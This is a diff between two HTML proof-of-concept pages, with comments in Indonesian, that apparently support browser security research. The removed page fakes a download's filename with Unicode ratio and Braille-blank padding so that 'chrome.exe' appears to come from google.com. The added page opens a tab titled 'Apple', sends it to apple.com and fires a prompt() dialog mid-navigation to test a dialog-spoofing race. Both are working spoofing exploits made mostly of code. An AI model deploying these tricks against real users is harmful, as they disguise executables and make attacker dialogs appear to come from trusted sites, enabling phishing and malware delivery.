@@ -1,128 +1,76 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Download UI Layout & Unicode PoC</title>
+  <head>
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, user-scalable=yes"
+    />
+    <title>Bypass Test PoC</title>
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #0f172a;
-            color: #f8fafc;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-            text-align: center;
-        }
-        .card {
-            background-color: #1e293b;
-            padding: 35px;
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-            max-width: 440px;
-            width: 100%;
-        }
-        h2 {
-            font-size: 20px;
-            margin-bottom: 10px;
-            color: #38bdf8;
-        }
-        p {
-            font-size: 13px;
-            color: #94a3b8;
-            margin-bottom: 24px;
-            line-height: 1.5;
-        }
-        button {
-            background-color: #2563eb;
-            color: white;
-            border: none;
-            padding: 14px 20px;
-            font-size: 15px;
-            font-weight: 600;
-            border-radius: 8px;
-            cursor: pointer;
-            width: 100%;
-            transition: background-color 0.2s, transform 0.1s;
-            margin-bottom: 12px;
-        }
-        button:hover {
-            background-color: #1d4ed8;
-        }
-        button:active {
-            transform: scale(0.98);
-        }
-        .status {
-            margin-top: 15px;
-            font-size: 12px;
-            color: #64748b;
-            background: #0f172a;
-            padding: 12px;
-            border-radius: 8px;
-            word-break: break-all;
-            text-align: left;
-            border: 1px solid #334155;
-        }
+      body, html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        background: #fff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      }
+      button {
+        padding: 20px 40px;
+        font-size: 20px;
+        background: #007aff;
+        color: #fff;
+        border: none;
+        border-radius: 12px;
+        cursor: pointer;
+      }
     </style>
-</head>
-<body>
-
-    <div class="card">
-        <h2>Download UI Security Suite</h2>
-        <p>Uji coba simulasi injeksi karakter Unicode <code>U+2236</code> (Ratio) & <code>U+2800</code> (Braille Blank) untuk menguji batas perenderan.</p>
-        
-        <button onclick="triggerPoC(1)">Uji 1: Payload Standar Kustom</button>
-        <button onclick="triggerPoC(2)">Uji 2: Heavy Padding Exhaustion</button>
-
-        <div id="status" class="status">Status: Menunggu interaksi pengguna...</div>
-    </div>
+  </head>
+  <body>
+    <button id="startBtn">TEST BYPASS CLICK</button>
 
     <script>
-        function updateStatus(message, filename) {
-            const statusEl = document.getElementById('status');
-            statusEl.innerHTML = `<strong>Status:</strong> ${message}<br><br><strong>Payload:</strong> <span style="color:#38bdf8; word-break:break-all;">${filename}</span>`;
-        }
+      document.getElementById("startBtn").onclick = function () {
+        this.remove();
 
-        function triggerPoC(testCase) {
-            // URL target spesifik yang menggunakan payload Unicode kustom Anda
-            const targetUrl = "https://ecdnts-del.github.io/test-apk/From%E2%88%B6%20google.com%20%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%20chrome.exe";
-            let craftedFilename = "";
+        // Membuka tab baru
+        const newTab = window.open("about:blank", "_blank");
 
-            if (testCase === 1) {
-                craftedFilename = "From∶ google.com ⠀⠀⠀⠀⠀⠀ chrome.exe";
-                updateStatus("Memicu Skenario 1 (Standard Unicode Spoofing)...", craftedFilename);
-            } else if (testCase === 2) {
-                // Stress test dengan padding berlebih untuk menguji batas vertikal layout
-                const heavyPadding = "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀";
-                craftedFilename = "From∶ google.com" + heavyPadding + "chrome.exe";
-                updateStatus("Memicu Skenario 2 (Heavy Vertical Padding)...", craftedFilename);
-            }
+        if (newTab) {
+          // Menulis konten attacker ke tab baru
+          newTab.document.write(`
+            <!DOCTYPE html>
+            <html>
+            <head><title>Apple</title></head>
+            <body style="margin:0;padding:0;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center">
+              <div>
+                <h1 style="font-size:48px;color:red;">TESTING DESYNCHRONIZATION</h1>
+                <p style="font-size:24px;color:#333;">Mencoba memicu prompt saat WebState masih dianggap visible tapi navigasi tertunda.</p>
+              </div>
+            </body>
+            </html>
+          `);
+          newTab.document.close();
 
-            const link = document.createElement('a');
-            link.href = targetUrl;
-            link.download = craftedFilename;
-            link.style.display = 'none';
+          // Navigasi asinkron ke target spoofing
+          setTimeout(() => {
+            newTab.location.href = "https://apple.com";
+          }, 10);
 
-            document.body.appendChild(link);
-
+          // Memanggil prompt sedikit lebih cepat/bersamaan untuk melihat 
+          // apakah dialog lolos sebelum IsVisible() bernilai false atau terblokir patch.
+          setTimeout(() => {
             try {
-                link.click();
-                setTimeout(() => {
-                    updateStatus("Unduhan berhasil dipicu! Silakan verifikasi perilaku antarmuka.", craftedFilename);
-                }, 300);
-            } catch (err) {
-                updateStatus("Gagal memicu unduhan: " + err.message, craftedFilename);
+              newTab.prompt("BYPASS TEST ROUTINE");
+            } catch (e) {
+              console.log("Dialog blocked or caught:", e);
             }
-
-            setTimeout(() => {
-                document.body.removeChild(link);
-            }, 1000);
+          }, 50);
         }
+      };
     </script>
-
-</body>
+  </body>
 </html>
